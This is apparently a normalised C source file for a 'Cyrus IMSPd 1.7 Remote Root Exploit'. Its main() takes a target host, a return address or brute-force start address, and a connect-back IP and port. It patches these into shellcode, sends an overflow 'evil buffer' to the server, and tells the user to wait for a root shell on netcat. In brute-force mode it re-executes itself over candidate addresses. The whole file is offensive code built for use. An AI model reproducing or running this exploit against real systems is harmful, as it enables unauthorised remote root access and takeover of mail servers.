
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {scalar_t__ Name; int Retaddr; } ;


 int BRUTEFORCE ;
 int ConectToHost (char*,int) ;
 char* CreateEvilBuffer (int) ;
 int DEFAULT_PORT ;
 int DEFAULT_START_ADDRESS ;
 char EOF ;
 int GetNextAddr (int) ;
 int* Shellcode ;

 TYPE_1__* Targets ;
 int Usage (char*) ;
 int atoi (char*) ;
 int close (int) ;
 int execl (char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,int ) ;
 int fatal (char*) ;
 int fprintf (int ,char*,...) ;
 int free (char*) ;
 char getopt (int,char**,char*) ;
 unsigned short htons (unsigned short) ;
 int send (int,char*,int ,int ) ;
 int sleep (int) ;
 int sprintf (char*,char*,int) ;
 int sscanf (char*,char*,int*,...) ;
 int stdout ;
 int strlen (char*) ;

int main(int argc, char **argv)
{
 extern char *optarg;
 extern int optind;
  char opt;
  char *Host = ((void*)0);
  int Port = DEFAULT_PORT;
  int Flags = 0;
  int StartAddress = DEFAULT_START_ADDRESS;
  int TargetNumber = 0;
  int Sock,rootSock,i;
  char *EvilBuffer;
  int CBackPort = 0;
  char Addr[20];
  int IP0 = 0,IP1 = 0,IP2 = 0,IP3 = 0;
  char *IPPtr,*CBackPortPtr;
  unsigned short *PortPtr = (unsigned short *)(Shellcode+39);

 fprintf(stdout,"\n==[ Cyrus IMSPd 1.7 Remote Root Exploit ]==\n\n");


 while ( (opt = getopt(argc,argv,"h:t:p:ba:r:i:")) != EOF)
 {
  switch(opt)
  {
   case 'i':
    if( sscanf(optarg,"%d.%d.%d.%d" ,&IP3,&IP2,&IP1,&IP0) != 4)
     Usage(argv[0]);
    IPPtr = optarg;
   break;
   case 'r':
    CBackPort = atoi(optarg);
    if(!CBackPort) Usage(argv[0]);
    CBackPortPtr = optarg;
   break;
   case 'h':
    Host = optarg;
   break;
   case 'p':
    Port = atoi(optarg);
    if(!Port) Usage(argv[0]);
   break;
   case 'b':
    if(Flags == 0)
     Flags = BRUTEFORCE;
    else
     Usage(argv[0]);
   break;
   case 'a':
    if( sscanf(optarg,"0x%lx",&StartAddress) != 1)
     Usage(argv[0]);
   break;
   case 't':
    TargetNumber = atoi(optarg);
    if(Flags == 0)
     Flags = 128;
    else
     Usage(argv[0]);
   break;
   default: Usage(argv[0]);
   break;
  }
 }
 if(Host == ((void*)0) || Flags == 0) Usage(argv[0]);
 if(CBackPort == 0) Usage(argv[0]);
 if(IP0 ==0 || IP1 == 0 || IP2 == 0 || IP3 == 0) Usage(argv[0]);


 for(i=0;;i++)
  if(Targets[i].Name == 0) break;
 if(--i<TargetNumber) Usage(argv[0]);


 Shellcode[33] = IP3;
 Shellcode[34] = IP2;
 Shellcode[35] = IP1;
 Shellcode[36] = IP0;
 *PortPtr = htons((unsigned short)CBackPort);

 if(Flags == 128)
  fprintf(stdout,"*** Target plataform      : %s\n",Targets[TargetNumber].Name);
 fprintf(stdout,"*** Target host           : %s\n",Host);
 fprintf(stdout,"*** Target port           : %u\n",Port);
 fprintf(stdout,"*** IP to connect back    : %u.%u.%u.%u\n" ,IP3,IP2,IP1,IP0);
 fprintf(stdout,"*** Port to connect back  : %u\n",CBackPort);

 if(Flags == 128)
  fprintf(stdout,"*** Target RET            : %#010x\n\n",Targets[TargetNumber].Retaddr);
 else
  fprintf(stdout,"*** Bruteforce mode start : %#010x\n\n",StartAddress);

 switch(Flags)
 {
  case 128:
   Sock = ConectToHost(Host,Port);
   if(Sock == -1) fatal("Could not connect");
   else fprintf(stdout,"[+] Connected\n");

   fprintf(stdout,"[+] Creating evil buffer\n");
   EvilBuffer = CreateEvilBuffer(Targets[TargetNumber].Retaddr);

   fprintf(stdout,"[+] Sending evil buffer\n");

   send(Sock,EvilBuffer,strlen(EvilBuffer),0);
   sleep(1);

   fprintf(stdout,"[+] Wait for root shell on your netcat\n\n");
  break;
  default:
   for(;;)
   {
    fprintf(stdout,"[+] Using RetAddr = %#010x\n",StartAddress);

    Sock = ConectToHost(Host,Port);
    if(Sock == -1)
    {

     fprintf(stdout,"[-] Error. Restarting ...\n\n");
     sleep(1);
     sprintf(Addr,"%#010x",StartAddress);
     execl(argv[0],argv[0],"-h",Host,"-b","-a",Addr,"-i",IPPtr,"-r",CBackPortPtr,0);
    }
    else
    {
     fprintf(stdout,"[+] Connected\n");

     fprintf(stdout,"[+] Creating evil buffer\n");
     EvilBuffer = CreateEvilBuffer(StartAddress);

     fprintf(stdout,"[+] Sending evil buffer\n");
     send(Sock,EvilBuffer,strlen(EvilBuffer),0);

     sleep(1);
     close(Sock);
     free(EvilBuffer);
     fprintf(stdout,"\n");

     StartAddress = GetNextAddr(StartAddress);
    }
   }
  break;
 }

 free(EvilBuffer);
 close(Sock);
}
